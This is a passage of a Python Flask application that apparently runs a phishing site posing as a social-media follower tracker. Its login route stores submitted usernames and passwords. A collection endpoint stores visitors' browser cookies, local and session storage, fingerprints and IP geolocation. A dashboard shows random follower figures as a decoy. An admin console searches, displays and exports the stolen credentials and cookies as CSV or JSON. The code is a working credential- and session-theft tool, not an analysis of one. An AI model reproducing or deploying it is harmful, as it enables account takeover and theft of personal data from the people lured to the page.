    g.cid = request.cookies.get("cid") or uuid.uuid4().hex[:16]


@app.after_request
def finalize(resp: Response) -> Response:
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

    if not request.cookies.get("cid"):
        resp.set_cookie("cid", g.cid, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


@app.route("/")
def index():
    ip = client_ip()
    info = geo(ip)

    emit("PAGE_VIEW", {
        "cid": g.cid, "ip": ip,
        "ua": request.headers.get("User-Agent", "")[:220],
        "referer": request.headers.get("Referer", "")[:220],
        "accept_lang": request.headers.get("Accept-Language", "")[:120],
        "cookie_header": request.headers.get("Cookie", "")[:1200],
        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
    })

    if session.get("user"):
        return redirect(url_for("dashboard"))
    return render_template_string(LOGIN_PAGE_HTML)


@app.route("/collect", methods=["POST"])
def collect():
    ip = client_ip()
    if not rate_ok(ip, 150):
        return ("", 429)

    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        try:
            data = json.loads(request.get_data(as_text=True) or "{}")
        except ValueError:
            data = {}
        if not isinstance(data, dict):
            data = {}

    cookies = (data.get("cookies") or "").strip()
    local = data.get("local") if isinstance(data.get("local"), list) else []
    sess = data.get("sess") if isinstance(data.get("sess"), list) else []
    meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
    reason = (data.get("reason") or "unknown")[:24]
    sid = (data.get("sid") or "")[:24]

    digest = digest_of(cookies, "|".join(map(str, local)), "|".join(map(str, sess)), json.dumps(meta, sort_keys=True))

    if reason == "poll" and is_duplicate(g.cid, digest):
        return ("", 204)

    info = geo(ip)
    header_cookie = request.headers.get("Cookie", "")

    cap_id = store_capture(
        cid=g.cid, sid=sid, reason=reason, digest=digest, ip=ip,
        ua=request.headers.get("User-Agent", ""),
        referer=request.headers.get("Referer", ""),
        accept_lang=request.headers.get("Accept-Language", ""),
        cookie_header=header_cookie, js_cookies=cookies,
        storage_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
        meta_json=json.dumps(meta, ensure_ascii=False),
        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
        geo_json=json.dumps(info, ensure_ascii=False),
        created_at=datetime.now(timezone.utc).isoformat(timespec="seconds"),
    )

    parsed = parse_cookie_string(cookies)
    emit("COOKIE_SNAPSHOT", {
        "cid": g.cid, "cap": cap_id, "reason": reason, "ip": ip,
        "ua": request.headers.get("User-Agent", "")[:200],
        "referer": request.headers.get("Referer", "")[:200],
        "cookie_header": header_cookie[:1200],
        "js_cookies": {k: v[:200] for k, v in parsed.items()} or "(none)",
        "localStorage": local[:8],
        "sessionStorage": sess[:8],
        "fingerprint": meta,
        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
    })

    session["cid"] = g.cid
    session["last_cap"] = cap_id
    return ("", 204)


@app.route("/login", methods=["POST"])
def login():
    ip = client_ip()
    if not rate_ok(ip, 40):
        return render_template_string(LOGIN_PAGE_HTML), 429

    username = (request.form.get("username") or "").strip() or "your.handle"
    password = request.form.get("password") or ""

    try:
        payload = json.loads(request.form.get("payload") or "{}")
    except ValueError:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}

    cookies = (payload.get("cookies") or request.form.get("browser_cookies") or "").strip()
    meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}
    local = payload.get("local") if isinstance(payload.get("local"), list) else []
    sess = payload.get("sess") if isinstance(payload.get("sess"), list) else []

    try:
        visit = int(request.cookies.get("vc", "0")) + 1
    except ValueError:
        visit = 1

    info = geo(ip)
    header_cookie = request.headers.get("Cookie", "")
    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")

    cap_id = store_capture(
        cid=g.cid, sid=(payload.get("sid") or "")[:24], reason="login", digest="",
        ip=ip, ua=request.headers.get("User-Agent", ""),
        referer=request.headers.get("Referer", ""),
        accept_lang=request.headers.get("Accept-Language", ""),
        cookie_header=header_cookie, js_cookies=cookies,
        storage_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
        meta_json=json.dumps(meta, ensure_ascii=False),
        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
    )
    store_login(
        capture_id=cap_id, username=username, password=password, ip=ip,
        ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
        js_cookies=cookies, meta_json=json.dumps(meta, ensure_ascii=False), created_at=stamp,
    )

    emit("LOGIN", {
        "cid": g.cid, "cap": cap_id, "ip": ip, "visit": visit,
        "USERNAME": username, "PASSWORD": password,
        "ua": request.headers.get("User-Agent", "")[:200],
        "cookie_header": header_cookie[:1200],
        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
        "fingerprint": meta,
        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
    })

    session.update({
        "user": username,
        "login_count": session.get("login_count", 0) + 1,
        "browser_cookies": cookies[:8000],
        "browser_meta": meta,
        "last_login": stamp,
        "last_cap": cap_id,
    })

    resp = redirect(url_for("dashboard"))
    resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
    resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
    resp.set_cookie("login_ts", stamp, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


@app.route("/dashboard")
def dashboard():
    username = session.get("user")
    if not username:
        return redirect(url_for("index"))

    page = render_template_string(
        RESULTS_PAGE_HTML,
        followers=random.randint(100, 1000),
        unfollowed=random.randint(50, 500),
        you_unfollowed=random.randint(50, 600),
        not_following_back=random.randint(50, 500),
        you_not_following=random.randint(50, 600),
        ghost_followers=random.randint(10, 200),
        blocked_you=random.randint(0, 50),
    )
    page = page.replace("your.handle", str(escape(username)))
    page = page.replace(">YO<", ">" + make_initials(username) + "<")
    return page


@app.route("/cookies")
def cookies_view():
    cap = session.get("last_cap")
    conn = connect()
    try:
        row = conn.execute(
            "SELECT * FROM captures WHERE id=?", (cap,)
        ).fetchone() if cap else conn.execute(
            "SELECT * FROM captures WHERE cid=? ORDER BY id DESC LIMIT 1", (g.cid,)
        ).fetchone()
    finally:
        conn.close()

    if not row:
        return jsonify({"ok": False, "message": "no capture yet for this browser"})

    return jsonify({
        "ok": True,
        "capture": row["id"],
        "created_at": row["created_at"],
        "client_id": row["cid"],
        "ip": row["ip"],
        "geo": json.loads(row["geo_json"] or "{}"),
        "cookie_header": row["cookie_header"],
        "js_cookies": parse_cookie_string(row["js_cookies"] or ""),
        "storage": json.loads(row["storage_json"] or "{}"),
        "fingerprint": json.loads(row["meta_json"] or "{}"),
    })


@app.route("/logout")
def logout():
    for k in ("user", "browser_cookies", "browser_meta", "last_login", "last_cap"):
        session.pop(k, None)
    return redirect(url_for("index"))


# ---------------- admin ----------------
@app.route("/admin")
def admin():
    if not admin_ok():
        return render_template_string(LOGIN_ADMIN_HTML), 401

    q = (request.args.get("q") or "").strip()
    only = request.args.get("only") or "all"

    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city,
                    (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog
             FROM captures c"""
    where, params = [], []
    if q:
        where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? OR c.cid LIKE ?"
                     " OR c.js_cookies LIKE ? OR c.id IN (SELECT capture_id FROM logins WHERE username LIKE ?))")
        params += [f"%{q}%"] * 6 + [f"%{q}%"]
    if only == "logins":
        where.append("(SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) > 0")
    if where:
        sql += " WHERE " + " AND ".join(where)
    sql += " ORDER BY c.id DESC LIMIT 300"

    conn = connect()
    try:
        rows = conn.execute(sql, params).fetchall()
    finally:
        conn.close()

    banner = "" if ADMIN_TOKEN else (
        '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in Render env.</div>'
    )
    body = (
        banner
        + '<form method="get" style="margin-bottom:14px;display:flex;gap:8px;flex-wrap:wrap">'
        f'<input name="q" value="{escape(q)}" placeholder="search ip / ua / city / username / cookie"'
        ' style="flex:1;min-width:220px;background:#141419;border:1px solid #232329;color:#ececf1;'
        'padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none">'
        '<button class="btn" type="submit">search</button>'
        '<a class="btn" href="/admin?only=logins">only logins</a>'
        '<a class="btn" href="/admin">reset</a></form>'
        '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
        '<th>ua</th><th>cookies</th><th>type</th><th></th></tr></thead>'
        f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
    )
    if not rows:
        body += '<div class="empty">no captures yet — open the login link</div>'
    return render_admin(body)


@app.route("/admin/feed")
def admin_feed():
    if not admin_ok():
        return jsonify({"rows": [], "last": 0}), 401
    since = request.args.get("since", "0")
    since = int(since) if since.isdigit() else 0
    conn = connect()
    try:
        rows = conn.execute(
            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city,
                      (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog
               FROM captures c WHERE c.id > ? ORDER BY c.id DESC LIMIT 40""",
            (since,),
        ).fetchall()
    finally:
        conn.close()
    last = max([r["id"] for r in rows], default=since)
    return jsonify({"rows": [row_html(r) for r in rows], "last": last})


@app.route("/admin/capture/<int:cap_id>")
def admin_capture(cap_id: int):
    if not admin_ok():
        return render_template_string(LOGIN_ADMIN_HTML), 401

    conn = connect()
    try:
        cap = conn.execute("SELECT * FROM captures WHERE id=?", (cap_id,)).fetchone()
        logs = conn.execute(
            "SELECT * FROM logins WHERE capture_id=? ORDER BY id", (cap_id,)
        ).fetchall()
    finally:
        conn.close()

    if not cap:
        abort(404)

    def block(title: str, content: str) -> str:
        return (
            f'<div class="block"><h2>{title} '
            f'<button class="btn" onclick="copy(this)">copy</button></h2>'
            f"<pre>{escape(content) or '-'}</pre></div>"
        )

    fp = json.dumps(json.loads(cap["meta_json"] or "{}"), indent=2, ensure_ascii=False)
    storage = json.loads(cap["storage_json"] or "{}")
    ginfo = json.dumps(json.loads(cap["geo_json"] or "{}"), indent=2, ensure_ascii=False)

    logins_html = ""
    for l in logs:
        logins_html += (
            f'<div class="block"><h2>credentials #{l["id"]} · {escape(l["created_at"] or "")}</h2>'
            f'<pre><b>username</b> {escape(l["username"] or "")}\n'
            f'<b>password</b> {escape(l["password"] or "")}\n'
            f'<b>ip</b> {escape(l["ip"] or "")}\n'
            f'<b>ua</b> {escape((l["ua"] or "")[:300])}</pre></div>'
        )

    body = (
        f'<a class="btn" href="/admin">← back</a> '
        f'<form class="inline" method="post" action="/admin/delete/{cap_id}" '
        f'onsubmit="return confirm(\'delete capture {cap_id}?\')">'
        f'<button class="btn" type="submit">delete</button></form>'
        f'<div style="height:16px"></div>'
        f'<div class="block"><h2>capture #{cap["id"]} · {escape(cap["reason"] or "")}</h2>'
        f'<pre>client_id {escape(cap["cid"] or "")}\nsession   {escape(cap["sid"] or "")}\n'
        f'time      {escape(cap["created_at"] or "")}\nip        {escape(cap["ip"] or "")}\n'
        f'ua        {escape(cap["ua"] or "")}\nreferer   {escape(cap["referer"] or "")}\n'
        f'lang      {escape(cap["accept_lang"] or "")}</pre></div>'
        + logins_html
        + block("cookie header (server)", cap["cookie_header"] or "")
        + block("document.cookie (js)", cap["js_cookies"] or "")
        + block("localStorage", "\n".join(storage.get("local", [])) or "")
        + block("sessionStorage", "\n".join(storage.get("session", [])) or "")
        + block("fingerprint", fp)
        + block("geo / network", ginfo)
    )
    return render_admin(body)


@app.route("/admin/delete/<int:cap_id>", methods=["POST"])
def admin_delete(cap_id: int):
    if not admin_ok():
        return redirect(url_for("admin"))
    conn = connect()
    try:
        conn.execute("DELETE FROM logins WHERE capture_id=?", (cap_id,))
        conn.execute("DELETE FROM captures WHERE id=?", (cap_id,))
        conn.commit()
    finally:
        conn.close()
    return redirect(url_for("admin"))


@app.route("/admin/export")
def admin_export():
    if not admin_ok():
        return redirect(url_for("admin"))

    fmt = request.args.get("fmt", "json")
    conn = connect()
    try:
        caps = conn.execute("SELECT * FROM captures ORDER BY id").fetchall()
        logs = conn.execute("SELECT * FROM logins ORDER BY id").fetchall()
    finally:
        conn.close()

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

    if fmt == "csv":
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["capture_id", "created_at", "ip", "country", "city", "ua", "reason",
                    "cookie_header", "js_cookies", "username", "password"])
        by_cap = {}
        for l in logs:
            by_cap.setdefault(l["capture_id"], []).append(l)
        for c in caps:
            ls = by_cap.get(c["id"]) or [None]
            for l in ls:
                w.writerow([
                    c["id"], c["created_at"], c["ip"], c["country"], c["city"],
                    c["ua"], c["reason"], c["cookie_header"], c["js_cookies"],
                    (l["username"] if l else ""), (l["password"] if l else ""),
                ])
        return Response(
            buf.getvalue(),
            mimetype="text/csv",
            headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"},
        )

    payload = {
        "exported_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "captures": [dict(c) for c in caps],
        "logins": [dict(l) for l in logs],
    }
    return Response(
        json.dumps(payload, indent=2, ensure_ascii=False),
        mimetype="application/json",
        headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"},
    )


@app.route("/healthz")
def healthz():
    conn = connect()
    try:
        caps = conn.execute("SELECT COUNT(*) c FROM captures").fetchone()["c"]
        logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
    finally:
        conn.close()
    return jsonify({
        "ok": True,
        "captures": caps,
        "logins": logs,
        "geo": GEO_ENABLED,
        "admin_locked": bool(ADMIN_TOKEN),
    })


# ---------------- errors ----------------
ERROR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>__C__</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#000;color:#f5f5f5;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center}
h1{font-size:64px;margin:0;background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);
-webkit-background-clip:text;background-clip:text;color:transparent}
p{color:#8e8e8e;margin:10px 0 24px}a{color:#0095f6;text-decoration:none;font-weight:600}</style>
</head><body><div><h1>__C__</h1><p>__M__</p><a href="/">back to login</a></div></body></html>"""


@app.errorhandler(404)
def e404(_):
    return render_template_string(ERROR_HTML.replace("__C__", "404")
                                 .replace("__M__", "page not found")), 404


@app.errorhandler(429)
def e429(_):
    return render_template_string(ERROR_HTML.replace("__C__", "429")
                                 .replace("__M__", "slow down a moment")), 429


@app.errorhandler(500)
def e500(_):
    return render_template_string(ERROR_HTML.replace("__C__", "500")
                                 .replace("__M__", "something broke")), 500


LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
<form method="get" action="/admin"><h1>insight console</h1>
<input type="password" name="token" placeholder="admin token" autofocus>
<button type="submit">unlock</button></form></body></html>"""

# ============================== boot ==============================
init_db()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
    app.run(host="0.0.0.0", port=port, debug=False)
